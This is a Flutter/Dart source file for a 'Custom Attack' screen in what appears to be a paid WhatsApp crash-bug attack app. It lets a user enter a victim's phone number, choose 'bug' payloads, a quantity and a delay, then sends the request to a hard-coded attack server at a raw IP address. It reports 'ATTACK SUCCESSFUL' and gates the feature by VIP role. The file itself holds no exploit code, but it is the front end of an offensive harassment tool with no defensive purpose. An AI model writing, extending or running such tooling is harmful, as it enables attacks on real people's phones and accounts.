import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;

class CustomAttackPage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listPayload;
  final String role;
  final String expiredDate;

  const CustomAttackPage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listPayload,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<CustomAttackPage> createState() => _CustomAttackPageState();
}

class _CustomAttackPageState extends State<CustomAttackPage>
    with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final qtyController = TextEditingController(text: "5");
  final delayController = TextEditingController(text: "100");
  static const String baseUrl = "http://188.166.176.83:10733";

  // ── Color Scheme (identik dashboard _C) ──
  static const _bg = Color(0xFF0c0d15);
  static const _bg2 = Color(0xFF11121c);
  static const _surface = Color(0xFF161823);
  static const _card = Color(0xFF1a1c29);
  static const _accent = Color(0xFFe8184a);
  static const _accent2 = Color(0xFFff4466);
  static const _gold = Color(0xFFFFD447);
  static const _text = Color(0xFFE2EAE5);
  static const _muted = Color(0x73E2EAE5);
  static const _muted2 = Color(0x38E2EAE5);
  static const _border = Color(0x1AE8184A);
  static const _border2 = Color(0x0FFFFFFF);
  static const _greenG1 = Color(0xFF25D366);
  static const _greenG2 = Color(0xFF18a84c);
  static const _purpleG1 = Color(0xFF9C27B0);
  static const _purpleG2 = Color(0xFF6a1a80);

  // ── Animations ──
  late AnimationController _stagger;
  late AnimationController _btnPress;

  // ── State ──
  List<String> selectedBugs = [];
  String _senderType = "global";
  bool _isSending = false;
  int _activeStep = 0;

  final Map<String, String> _senderLimits = {
    "global": "Max: 10 · Delay: 500ms",
    "private": "Max: 200 · Min Delay: 10ms",
  };

  @override
  void initState() {
    super.initState();
    _stagger = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 900),
    )..forward();

    _btnPress = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 100),
      lowerBound: 0.0,
      upperBound: 1.0,
    );

    if (widget.listPayload.isNotEmpty) {
      selectedBugs.add(widget.listPayload[0]['bug_id']);
    }
  }

  @override
  void dispose() {
    _stagger.dispose();
    _btnPress.dispose();
    targetController.dispose();
    qtyController.dispose();
    delayController.dispose();
    super.dispose();
  }

  Animation<double> _anim(int i) {
    final s = (i * 0.07).clamp(0.0, 0.55);
    final e = (s + 0.38).clamp(0.0, 1.0);
    return CurvedAnimation(
      parent: _stagger,
      curve: Interval(s, e, curve: Curves.easeOut),
    );
  }

  String? formatPhoneNumber(String input) {
    final c = input.replaceAll(RegExp(r'[^\d]'), '');
    if (c.startsWith('0') || c.length < 8) return null;
    return c;
  }

  void _toggleBug(String id) {
    setState(() {
      if (selectedBugs.contains(id))
        selectedBugs.remove(id);
      else
        selectedBugs.add(id);
    });
  }

  // ── API ──
  Future<void> _sendCustomBug() async {
    if (_isSending) return;
    _btnPress.forward().then((_) => _btnPress.reverse());
    setState(() {
      _isSending = true;
      _activeStep = 1;
    });

    final target = formatPhoneNumber(targetController.text.trim());
    final qty = int.tryParse(qtyController.text) ?? 1;
    final delay = int.tryParse(delayController.text) ?? 100;

    if (target == null) {
      _showAlert(
        "Invalid Number",
        "Use international format (628xxx, 1xxx), not 08xxx.",
      );
      setState(() {
        _isSending = false;
        _activeStep = 0;
      });
      return;
    }
    if (selectedBugs.isEmpty) {
      _showAlert("No Payload", "Select at least one payload.");
      setState(() {
        _isSending = false;
        _activeStep = 0;
      });
      return;
    }

    try {
      final bugs = selectedBugs.join(',');
      final res = await http.get(
        Uri.parse(
          "$baseUrl/api/whatsapp/customBug?key=${widget.sessionKey}"
          "&target=$target&bug=$bugs&qty=$qty&delay=$delay"
          "&senderType=$_senderType",
        ),
      );
      final data = jsonDecode(res.body);

      if (data["valid"] == false) {
        _showAlert("Failed", data["message"] ?? "Unknown error.");
      } else {
        setState(() => _activeStep = 2);
        _showSuccess(target, data["details"] ?? {});
      }
    } catch (_) {
      _showAlert("Error", "Connection error.");
    } finally {
      setState(() {
        _isSending = false;
        if (_activeStep != 2) _activeStep = 0;
      });
    }
  }

  void _showSuccess(String target, Map<String, dynamic> details) {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => _SuccessDialog(
        target: target,
        details: details,
        onDismiss: () {
          Navigator.of(context).pop();
          setState(() => _activeStep = 0);
        },
      ),
    );
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _surface,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _accent.withOpacity(0.4)),
        ),
        title: Row(
          children: [
            Container(
              width: 36,
              height: 36,
              decoration: BoxDecoration(
                color: _accent.withOpacity(0.12),
                borderRadius: BorderRadius.circular(10),
              ),
              child: const Icon(
                Icons.warning_amber_rounded,
                color: _accent,
                size: 18,
              ),
            ),
            const SizedBox(width: 12),
            Text(
              title,
              style: const TextStyle(
                fontFamily: 'MADEEvolveSansEVO',
                fontSize: 14,
                fontWeight: FontWeight.bold,
                color: _text,
              ),
            ),
          ],
        ),
        content: Text(msg, style: const TextStyle(fontSize: 13, color: _muted)),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
              decoration: BoxDecoration(
                color: _accent,
                borderRadius: BorderRadius.circular(10),
              ),
              child: const Text(
                "CLOSE",
                style: TextStyle(
                  color: Colors.white,
                  fontWeight: FontWeight.bold,
                  fontSize: 12,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════
  // REUSABLE WIDGETS
  // ═══════════════════════════════════════════════════════════════

  Widget _sectionLabel(String title, {Widget? badge}) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 12),
      child: Row(
        children: [
          Container(
            width: 4,
            height: 18,
            decoration: BoxDecoration(
              gradient: const LinearGradient(colors: [_accent, _accent2]),
              borderRadius: BorderRadius.circular(2),
            ),
          ),
          const SizedBox(width: 10),
          Text(
            title,
            style: const TextStyle(
              fontFamily: 'MADEEvolveSansEVO',
              fontSize: 12,
              fontWeight: FontWeight.bold,
              color: _text,
              letterSpacing: 1,
            ),
          ),
          if (badge != null) ...[const Spacer(), badge],
        ],
      ),
    );
  }

  Widget _sectionCard({required Widget child, required int idx}) {
    final a = _anim(idx);
    return FadeTransition(
      opacity: a,
      child: SlideTransition(
        position: Tween(
          begin: const Offset(0, 0.05),
          end: Offset.zero,
        ).animate(a),
        child: Container(
          width: double.infinity,
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: _card,
            borderRadius: BorderRadius.circular(18),
            border: Border.all(color: _border),
          ),
          child: child,
        ),
      ),
    );
  }

  Widget _inputField({
    required TextEditingController ctrl,
    required String hint,
    required IconData icon,
    bool enabled = true,
    TextInputType? kb,
  }) {
    return Container(
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.3),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: _border),
      ),
      child: TextField(
        controller: ctrl,
        enabled: enabled,
        keyboardType: kb,
        style: TextStyle(color: enabled ? _text : _muted2, fontSize: 14),
        cursorColor: _accent,
        decoration: InputDecoration(
          hintText: hint,
          hintStyle: const TextStyle(color: _muted2, fontSize: 13),
          prefixIcon: Icon(icon, color: _muted, size: 18),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: BorderSide.none,
          ),
          contentPadding: const EdgeInsets.symmetric(
            horizontal: 14,
            vertical: 14,
          ),
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION BUILDERS
  // ═══════════════════════════════════════════════════════════════

  Widget _buildUserCard() {
    return _sectionCard(
      idx: 0,
      child: Row(
        children: [
          Container(
            width: 46,
            height: 46,
            decoration: BoxDecoration(
              gradient: LinearGradient(colors: [_accent, _accent2]),
              borderRadius: BorderRadius.circular(12),
            ),
            child: Icon(
              widget.role.toLowerCase() == "vip"
                  ? FontAwesomeIcons.crown
                  : FontAwesomeIcons.userSecret,
              color: Colors.white,
              size: 18,
            ),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  widget.username.toUpperCase(),
                  style: const TextStyle(
                    fontFamily: 'MADEEvolveSansEVO',
                    fontSize: 14,
                    fontWeight: FontWeight.bold,
                    color: _text,
                  ),
                ),
                const SizedBox(height: 4),
                Container(
                  padding: const EdgeInsets.symmetric(
                    horizontal: 8,
                    vertical: 2,
                  ),
                  decoration: BoxDecoration(
                    color: _accent.withOpacity(0.12),
                    borderRadius: BorderRadius.circular(20),
                  ),
                  child: Text(
                    widget.role.toUpperCase(),
                    style: const TextStyle(
                      color: _accent,
                      fontSize: 9,
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                ),
              ],
            ),
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
            decoration: BoxDecoration(
              color: _surface,
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _border),
            ),
            child: Column(
              children: [
                const Icon(
                  FontAwesomeIcons.calendarAlt,
                  color: _gold,
                  size: 12,
                ),
                const SizedBox(height: 2),
                Text(
                  widget.expiredDate,
                  style: const TextStyle(
                    color: _gold,
                    fontSize: 10,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildTarget() {
    return _sectionCard(
      idx: 1,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _sectionLabel("TARGET NUMBER"),
          _inputField(
            ctrl: targetController,
            hint: "e.g., 628123456789",
            icon: FontAwesomeIcons.globe,
          ),
          const SizedBox(height: 8),
          const Text(
            "International format, no + or spaces",
            style: TextStyle(fontSize: 11, color: _muted2),
          ),
        ],
      ),
    );
  }

  Widget _buildPayloads() {
    return _sectionCard(
      idx: 2,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _sectionLabel(
            "SELECT PAYLOADS",
            badge: Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
              decoration: BoxDecoration(
                color: _accent.withOpacity(0.12),
                borderRadius: BorderRadius.circular(20),
              ),
              child: Text(
                "${selectedBugs.length} SELECTED",
                style: const TextStyle(
                  color: _accent,
                  fontSize: 9,
                  fontWeight: FontWeight.w600,
                ),
              ),
            ),
          ),
          if (widget.listPayload.isEmpty)
            Container(
              width: double.infinity,
              padding: const EdgeInsets.symmetric(vertical: 20),
              decoration: BoxDecoration(
                color: _surface,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _border),
              ),
              child: const Center(
                child: Text(
                  "No payloads available",
                  style: TextStyle(fontSize: 13, color: _muted2),
                ),
              ),
            )
          else
            Wrap(
              spacing: 8,
              runSpacing: 8,
              children: widget.listPayload.map((bug) {
                final id = bug['bug_id'];
                final name = bug['bug_name'];
                final sel = selectedBugs.contains(id);
                return GestureDetector(
                  onTap: () => _toggleBug(id),
                  child: AnimatedContainer(
                    duration: const Duration(milliseconds: 200),
                    padding: const EdgeInsets.symmetric(
                      horizontal: 14,
                      vertical: 9,
                    ),
                    decoration: BoxDecoration(
                      gradient: sel
                          ? const LinearGradient(colors: [_accent, _accent2])
                          : null,
                      color: sel ? null : _surface,
                      borderRadius: BorderRadius.circular(20),
                      border: Border.all(
                        color: sel ? _accent : _border,
                        width: sel ? 1.5 : 1,
                      ),
                    ),
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        if (sel) ...[
                          const Icon(
                            Icons.check_circle,
                            color: Colors.white,
                            size: 14,
                          ),
                          const SizedBox(width: 6),
                        ],
                        Text(
                          name,
                          style: TextStyle(
                            color: sel ? Colors.white : _muted,
                            fontWeight: FontWeight.w600,
                            fontSize: 12,
                          ),
                        ),
                      ],
                    ),
                  ),
                );
              }).toList(),
            ),
        ],
      ),
    );
  }

  Widget _buildSenderMode() {
    return _sectionCard(
      idx: 3,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _sectionLabel("SENDER MODE"),
          Row(
            children: [
              Expanded(
                child: _senderOpt(
                  title: "GLOBAL",
                  icon: FontAwesomeIcons.globe,
                  sub: _senderLimits["global"]!,
                  type: "global",
                  colors: const [_greenG1, _greenG2],
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: _senderOpt(
                  title: "PRIVATE",
                  icon: FontAwesomeIcons.userLock,
                  sub: _senderLimits["private"]!,
                  type: "private",
                  colors: const [_purpleG1, _purpleG2],
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _senderOpt({
    required String title,
    required IconData icon,
    required String sub,
    required String type,
    required List<Color> colors,
  }) {
    final active = _senderType == type;
    return GestureDetector(
      onTap: () => setState(() => _senderType = type),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
          gradient: active ? LinearGradient(colors: colors) : null,
          color: active ? null : _surface,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(
            color: active ? colors[0] : _border,
            width: active ? 1.5 : 1,
          ),
        ),
        child: Column(
          children: [
            Icon(icon, color: active ? Colors.white : _muted, size: 22),
            const SizedBox(height: 8),
            Text(
              title,
              style: TextStyle(
                fontFamily: 'MADEEvolveSansEVO',
                fontSize: 11,
                fontWeight: FontWeight.bold,
                color: active ? Colors.white : _text,
                letterSpacing: 1,
              ),
            ),
            const SizedBox(height: 4),
            Text(
              sub,
              style: TextStyle(
                fontSize: 9,
                color: active ? Colors.white70 : _muted2,
              ),
              textAlign: TextAlign.center,
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildParams() {
    return _sectionCard(
      idx: 4,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _sectionLabel("ATTACK PARAMETERS"),
          Row(
            children: [
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Text(
                      "QUANTITY",
                      style: TextStyle(
                        fontSize: 10,
                        color: _muted,
                        letterSpacing: 1,
                      ),
                    ),
                    const SizedBox(height: 6),
                    _inputField(
                      ctrl: qtyController,
                      hint: "1-200",
                      icon: Icons.numbers,
                      kb: TextInputType.number,
                    ),
                  ],
                ),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Text(
                      "DELAY (ms)",
                      style: TextStyle(
                        fontSize: 10,
                        color: _muted,
                        letterSpacing: 1,
                      ),
                    ),
                    const SizedBox(height: 6),
                    _inputField(
                      ctrl: delayController,
                      hint: _senderType == "global" ? "Fixed 500ms" : "10-1000",
                      icon: Icons.timer,
                      enabled: _senderType == "private",
                      kb: TextInputType.number,
                    ),
                  ],
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildStatus() {
    return _sectionCard(
      idx: 5,
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceEvenly,
        children: [
          _statusItem(FontAwesomeIcons.server, "SERVER"),
          Container(width: 1, height: 28, color: _border),
          _statusItem(FontAwesomeIcons.shieldHalved, "SECURITY"),
          Container(width: 1, height: 28, color: _border),
          _statusItem(FontAwesomeIcons.database, "DATABASE"),
        ],
      ),
    );
  }

  Widget _statusItem(IconData icon, String label) {
    return Row(
      mainAxisSize: MainAxisSize.min,
      children: [
        Container(
          width: 7,
          height: 7,
          decoration: BoxDecoration(
            color: _greenG1,
            shape: BoxShape.circle,
            boxShadow: [
              BoxShadow(color: _greenG1.withOpacity(0.5), blurRadius: 4),
            ],
          ),
        ),
        const SizedBox(width: 6),
        Icon(icon, color: _muted, size: 13),
        const SizedBox(width: 5),
        Text(
          label,
          style: const TextStyle(fontSize: 9, color: _muted2, letterSpacing: 1),
        ),
      ],
    );
  }

  Widget _buildExecuteBtn() {
    final a = _anim(6);
    return FadeTransition(
      opacity: a,
      child: SlideTransition(
        position: Tween(
          begin: const Offset(0, 0.05),
          end: Offset.zero,
        ).animate(a),
        child: AnimatedBuilder(
          animation: _btnPress,
          builder: (_, child) {
            final s = 1.0 - _btnPress.value * 0.03;
            return Transform.scale(
              scale: s,
              child: Container(
                width: double.infinity,
                height: 54,
                decoration: BoxDecoration(
                  gradient: const LinearGradient(colors: [_accent, _accent2]),
                  borderRadius: BorderRadius.circular(14),
                  boxShadow: [
                    BoxShadow(
                      color: _accent.withOpacity(0.3),
                      blurRadius: 20,
                      offset: const Offset(0, 6),
                    ),
                  ],
                ),
                child: Material(
                  color: Colors.transparent,
                  child: InkWell(
                    borderRadius: BorderRadius.circular(14),
                    onTap: _isSending ? null : _sendCustomBug,
                    child: Center(
                      child: _isSending
                          ? const SizedBox(
                              width: 22,
                              height: 22,
                              child: CircularProgressIndicator(
                                color: Colors.white,
                                strokeWidth: 2.5,
                              ),
                            )
                          : const Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Icon(
                                  FontAwesomeIcons.paperPlane,
                                  color: Colors.white,
                                  size: 16,
                                ),
                                SizedBox(width: 10),
                                Text(
                                  "EXECUTE ATTACK",
                                  style: TextStyle(
                                    fontFamily: 'MADEEvolveSansEVO',
                                    fontSize: 13,
                                    fontWeight: FontWeight.bold,
                                    color: Colors.white,
                                    letterSpacing: 2,
                                  ),
                                ),
                              ],
                            ),
                    ),
                  ),
                ),
              ),
            );
          },
        ),
      ),
    );
  }

  Widget _buildFooter() {
    return FadeTransition(
      opacity: _anim(7),
      child: Padding(
        padding: const EdgeInsets.only(top: 18, bottom: 32),
        child: Column(
          children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Container(
                  width: 5,
                  height: 5,
                  decoration: BoxDecoration(
                    color: _greenG1,
                    shape: BoxShape.circle,
                    boxShadow: [BoxShadow(color: _greenG1, blurRadius: 4)],
                  ),
                ),
                const SizedBox(width: 6),
                const Text(
                  "SECURE CONNECTION",
                  style: TextStyle(
                    fontSize: 9,
                    color: _muted2,
                    letterSpacing: 1,
                    fontFamily: 'MADEEvolveSansEVO',
                  ),
                ),
                const SizedBox(width: 10),
                const Icon(Icons.fingerprint, color: _muted2, size: 12),
              ],
            ),
            const SizedBox(height: 6),
            const Text(
              "SYAHID SECURITY · ENCRYPTED",
              style: TextStyle(
                fontSize: 8,
                color: _muted2,
                letterSpacing: 1.5,
                fontFamily: 'ShareTechMono',
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════
  // MAIN BUILD
  // ═══════════════════════════════════════════════════════════════
  @override
  Widget build(BuildContext context) {
    if (![
      "vip",
      "owner",
      "high admin",
      "moderator",
      "founder",
    ].contains(widget.role.toLowerCase())) {
      return Scaffold(
        backgroundColor: _bg,
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Container(
                width: 80,
                height: 80,
                decoration: BoxDecoration(
                  color: _accent.withOpacity(0.1),
                  shape: BoxShape.circle,
                  border: Border.all(color: _accent.withOpacity(0.3), width: 2),
                ),
                child: const Icon(
                  FontAwesomeIcons.lock,
                  color: _accent,
                  size: 32,
                ),
              ),
              const SizedBox(height: 20),
              const Text(
                "ACCESS DENIED",
                style: TextStyle(
                  fontFamily: 'MADEEvolveSansEVO',
                  fontSize: 20,
                  fontWeight: FontWeight.bold,
                  color: _accent,
                  letterSpacing: 2,
                ),
              ),
              const SizedBox(height: 10),
              Text(
                "This feature is only available for\nVIP and above users",
                style: const TextStyle(fontSize: 13, color: _muted),
                textAlign: TextAlign.center,
              ),
            ],
          ),
        ),
      );
    }

    return Scaffold(
      backgroundColor: _bg,
      appBar: AppBar(
        backgroundColor: _bg2,
        elevation: 0,
        leading: GestureDetector(
          onTap: () => Navigator.of(context).pop(),
          child: Container(
            margin: const EdgeInsets.all(8),
            width: 36,
            height: 36,
            decoration: BoxDecoration(
              color: _surface,
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _border2),
            ),
            child: const Icon(
              Icons.arrow_back_ios_new,
              color: _muted,
              size: 14,
            ),
          ),
        ),
        title: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              width: 32,
              height: 32,
              decoration: BoxDecoration(
                gradient: const LinearGradient(colors: [_greenG1, _greenG2]),
                borderRadius: BorderRadius.circular(8),
              ),
              child: const Icon(
                FontAwesomeIcons.bug,
                color: Colors.white,
                size: 14,
              ),
            ),
            const SizedBox(width: 10),
            const Text(
              "CUSTOM ATTACK",
              style: TextStyle(
                fontFamily: 'MADEEvolveSansEVO',
                fontSize: 14,
                fontWeight: FontWeight.bold,
                color: _text,
                letterSpacing: 1,
              ),
            ),
          ],
        ),
        centerTitle: true,
        bottom: const PreferredSize(
          preferredSize: Size.fromHeight(1),
          child: Divider(height: 1, color: _border),
        ),
      ),
      body: SingleChildScrollView(
        physics: const BouncingScrollPhysics(),
        padding: const EdgeInsets.fromLTRB(14, 16, 14, 0),
        child: Column(
          children: [
            _buildUserCard(),
            const SizedBox(height: 12),
            _buildTarget(),
            const SizedBox(height: 12),
            _buildPayloads(),
            const SizedBox(height: 12),
            _buildSenderMode(),
            const SizedBox(height: 12),
            _buildParams(),
            const SizedBox(height: 12),
            _buildStatus(),
            const SizedBox(height: 20),
            _buildExecuteBtn(),
            _buildFooter(),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
// SUCCESS DIALOG
// ═══════════════════════════════════════════════════════════════
class _SuccessDialog extends StatefulWidget {
  final String target;
  final Map<String, dynamic> details;
  final VoidCallback onDismiss;

  const _SuccessDialog({
    required this.target,
    required this.details,
    required this.onDismiss,
  });

  @override
  State<_SuccessDialog> createState() => _SuccessDialogState();
}

class _SuccessDialogState extends State<_SuccessDialog>
    with SingleTickerProviderStateMixin {
  late AnimationController _ctrl;
  late Animation<double> _scaleAnim;
  late Animation<double> _fadeAnim;

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 450),
    );
    _scaleAnim = CurvedAnimation(parent: _ctrl, curve: Curves.easeOutBack);
    _fadeAnim = CurvedAnimation(parent: _ctrl, curve: Curves.easeOut);
    _ctrl.forward();
  }

  @override
  void dispose() {
    _ctrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return FadeTransition(
      opacity: _fadeAnim,
      child: ScaleTransition(
        scale: _scaleAnim,
        child: Dialog(
          backgroundColor: Colors.transparent,
          child: Container(
            width: double.infinity,
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              color: const Color(0xFF1a1c29),
              borderRadius: BorderRadius.circular(22),
              border: Border.all(color: const Color(0x1AE8184A)),
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  width: 64,
                  height: 64,
                  decoration: BoxDecoration(
                    gradient: const LinearGradient(
                      colors: [Color(0xFF25D366), Color(0xFF18a84c)],
                    ),
                    shape: BoxShape.circle,
                    boxShadow: [
                      BoxShadow(
                        color: const Color(0xFF25D366).withOpacity(0.3),
                        blurRadius: 16,
                      ),
                    ],
                  ),
                  child: const Icon(
                    FontAwesomeIcons.checkDouble,
                    color: Colors.white,
                    size: 28,
                  ),
                ),
                const SizedBox(height: 16),
                const Text(
                  "ATTACK SUCCESSFUL",
                  style: TextStyle(
                    fontFamily: 'MADEEvolveSansEVO',
                    fontSize: 16,
                    fontWeight: FontWeight.bold,
                    color: Color(0xFFE2EAE5),
                    letterSpacing: 1,
                  ),
                ),
                const SizedBox(height: 20),
                Container(
                  width: double.infinity,
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: const Color(0xFF161823),
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: const Color(0x1AE8184A)),
                  ),
                  child: Column(
                    children: [
                      _detailRow("Target", widget.target),
                      _detailRow(
                        "Sender",
                        widget.details["senderType"]?.toString() ?? "-",
                      ),
                      _detailRow(
                        "Payloads",
                        widget.details["bugs"]?.toString() ?? "-",
                      ),
                      _detailRow(
                        "Quantity",
                        widget.details["qty"]?.toString() ?? "-",
                      ),
                      _detailRow(
                        "Delay",
                        "${widget.details["delay"] ?? "-"}ms",
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 20),
                SizedBox(
                  width: double.infinity,
                  height: 46,
                  child: ElevatedButton(
                    onPressed: widget.onDismiss,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFFe8184a),
                      foregroundColor: Colors.white,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                      elevation: 0,
                    ),
                    child: const Text(
                      "DISMISS",
                      style: TextStyle(
                        fontFamily: 'MADEEvolveSansEVO',
                        fontSize: 12,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 2,
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _detailRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 5),
      child: Row(
        children: [
          SizedBox(
            width: 80,
            child: Text(
              "[$label]",
              style: const TextStyle(
                fontSize: 11,
                color: Color(0x73E2EAE5),
                fontFamily: 'ShareTechMono',
              ),
            ),
          ),
          Expanded(
            child: Text(
              value,
              style: const TextStyle(
                fontSize: 11,
                color: Color(0xFFe8184a),
                fontWeight: FontWeight.w600,
                fontFamily: 'ShareTechMono',
              ),
            ),
          ),
        ],
      ),
    );
  }
}
